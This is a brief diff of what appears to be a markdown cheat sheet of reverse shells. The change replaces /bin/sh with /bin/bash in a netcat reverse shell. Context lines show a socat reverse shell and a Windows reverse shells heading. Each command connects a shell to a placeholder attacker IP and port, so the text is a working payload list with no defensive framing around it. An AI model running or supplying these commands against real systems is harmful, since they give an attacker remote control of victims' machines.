@@ -28,7 +28,7 @@ socat TCP:<attacker_ip>:<attacker_port> EXEC:/bin/sh
 
 5. **Netcat Reverse Shell**
 ```bash
-nc -e /bin/sh <attacker_ip> <attacker_port>
+nc -e /bin/bash <attacker_ip> <attacker_port>
 ```
 
 #### Windows Reverse Shells
